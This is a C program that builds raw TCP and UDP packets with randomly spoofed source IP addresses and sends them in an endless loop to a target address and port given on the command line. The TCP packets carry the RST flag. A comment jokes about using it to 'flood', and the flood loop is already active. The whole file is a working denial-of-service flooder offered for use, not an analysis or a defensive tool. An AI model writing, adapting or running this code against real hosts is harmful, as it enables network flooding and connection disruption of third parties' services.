#include <stdio.h>
#include <string.h> //memset
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/tcp.h>	//Provides declarations for tcp header
#include <netinet/ip.h>	//Provides declarations for ip header
#define SIZE 8192

/* UDP Header */
struct udpheader
{
  u_int16_t udp_sport;           /* source port */
  u_int16_t udp_dport;           /* destination port */
  u_int16_t udp_ulen;            /* udp length */
  u_int16_t udp_sum;             /* udp checksum */
};

struct udp_chksum    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
};
struct tcp_chksum    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	
	struct tcphdr tcp;
};

char* generate_rand_ip4(char ip_address[32]){
	int hi_num=255;
	int low_num=1;
    int  first = (rand() % (hi_num - low_num)) + low_num;
    int  second = (rand() % (hi_num - low_num)) + low_num;
    int  third = (rand() % (hi_num - low_num)) + low_num;
    int  fourth = (rand() % (hi_num - low_num)) + low_num;
	char first_s[4];
	char second_s[4];
	char third_s[4];
	char fourth_s[4];
    sprintf(first_s, "%d", first);
    sprintf(second_s, "%d", second);
    sprintf(third_s, "%d", third);
    sprintf(fourth_s, "%d", fourth);
	memcpy(ip_address,first_s,strlen(first_s));
    ip_address[strlen(first_s)]='.';
	memcpy(ip_address+strlen(first_s)+1,second_s,strlen(second_s));
    ip_address[strlen(first_s)+1+strlen(second_s)]='.';
	memcpy(ip_address+strlen(first_s)+2+strlen(second_s),third_s,strlen(third_s));
    ip_address[strlen(first_s)+2+strlen(second_s)+strlen(third_s)]='.';
	memcpy(ip_address+strlen(first_s)+3+strlen(second_s)+strlen(third_s),fourth_s,strlen(fourth_s));

    return ip_address;    
}

unsigned short in_cksum(unsigned short *ptr,int nbytes) {
	register long sum=0;
	unsigned short oddbyte;
	register short answer;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

void send_tcp(char *buffer,int dst_port,char dst_ip[32]){
	//Create a raw sock
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	//IP header
	struct iphdr *iph = (struct iphdr *) buffer;
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (buffer + sizeof (struct iphdr));
	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(dst_port);
	sin.sin_addr.s_addr = inet_addr (dst_ip);
	//Uncommend the loop if you want to flood :)
	while (1)
	{
	memset(buffer,0,SIZE);
	char src_ip[32]={0};
	generate_rand_ip4(src_ip);
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
	iph->id = htons(52431);	//Id of this packet
	iph->ttl = 222;
	iph->protocol = IPPROTO_TCP;
	iph->saddr = inet_addr ( src_ip );	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = 0;
	//TCP Header
	tcph->source = htons (1234);
	tcph->dest = htons (dst_port);
	tcph->doff = 5;		/* first and only tcp segment */
	tcph->rst=1;
	tcph->window = htons (5840);	/* maximum allowed window size */
	//Now the TCP checksum
	struct tcp_chksum tcp_check;
	tcp_check.source_address = iph->saddr;
	tcp_check.dest_address = sin.sin_addr.s_addr;
	tcp_check.placeholder = 0;
	tcp_check.protocol = IPPROTO_TCP;
	tcp_check.tcp_length = htons(sizeof (struct tcphdr));
	
	memcpy(&tcp_check.tcp , tcph , sizeof (struct tcphdr));
	
	tcph->check = in_cksum( (unsigned short*) &tcp_check , sizeof (struct tcp_chksum));
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	
		//Send the packet
		if (sendto (sock, buffer, iph->tot_len, 0,(struct sockaddr *) &sin,sizeof (sin)) < 0)			{
			printf ("error\n");
		}
	}
}
void send_udp(char* buffer, int dst_port, char dst_ip[32]){
	int sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(dst_port);
	sin.sin_addr.s_addr = inet_addr (dst_ip);
	//IP header
	struct iphdr *iph = (struct iphdr *) buffer;
	//TCP header
	struct udpheader *udp = (struct udpheader *) (buffer + sizeof (struct iphdr));
	char *data = buffer + sizeof(struct iphdr) + sizeof(struct udpheader);
	// Massage of the udp packet.
	const char *msg = "Spoofed IP packet!";
	int data_len = strlen(msg);
	// Copy massage to udp payload.
	strncpy (data, msg, data_len);
	//Uncommend the loop if you want to flood :)
	while (1)
	{
	memset(buffer,0,SIZE);
	char src_ip[32]={0};
	generate_rand_ip4(src_ip);
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udpheader)+data_len;
	iph->id = htons(52431);	//Id of this packet
	iph->ttl = 222;
	iph->protocol = IPPROTO_UDP;
	iph->saddr = inet_addr ( src_ip );	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;
	struct udp_chksum udp_check;
	//Fill in the UDP Header
	udp->udp_sport = htons(12345);
	udp->udp_dport = htons(dst_port);
	udp->udp_ulen = htons(8+data_len);
	udp->udp_sum =  0;
	udp_check.source_address=iph->saddr;
	udp_check.dest_address=iph->daddr;
	udp_check.placeholder=0;
	udp_check.protocol=iph->protocol;
	udp_check.tcp_length=htons(sizeof(struct udpheader)+data_len);
	int size_check=sizeof(struct udp_chksum)+sizeof(struct udpheader)+data_len;
	char* check_calc=(char*)malloc(size_check);
	memcpy(check_calc,&udp_check,sizeof(struct udp_chksum));
	memcpy(check_calc+sizeof(struct udp_chksum),udp,sizeof(struct udpheader)+data_len);
	udp->udp_sum=in_cksum((unsigned short*)check_calc,size_check);
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	

		//Send the packet
		if (sendto (sock, buffer, iph->tot_len, 0,(struct sockaddr *) &sin,sizeof (sin)) < 0)			{
			printf ("error\n");
		}
	}
}
int main (int argc, char* argv[])
{
	srand(time(NULL));
	char dst_ip[32]="127.0.0.1";
	char buffer[SIZE];
	memset (buffer, 0, SIZE);	/* zero out the buffer */
	int packet_choice=0; // 1 For UDP , 0 For TCP
	int dst_port=443;
	for (int i = 1; i < argc; i++)
	{
		if(!strcmp(argv[i],"-t")){
			memset(dst_ip,0,32);
			strcpy(dst_ip,argv[i+1]);
			i++;
		}else if(!strcmp(argv[i],"-r")){
			packet_choice=1;
		}else if(!strcmp(argv[i],"-p")){
			dst_port=atoi(argv[i+1]);
		}
	}
	if(packet_choice){
		send_udp(buffer,dst_port,dst_ip);
	}else{
		send_tcp(buffer,dst_port,dst_ip);
	}
	return 0;
}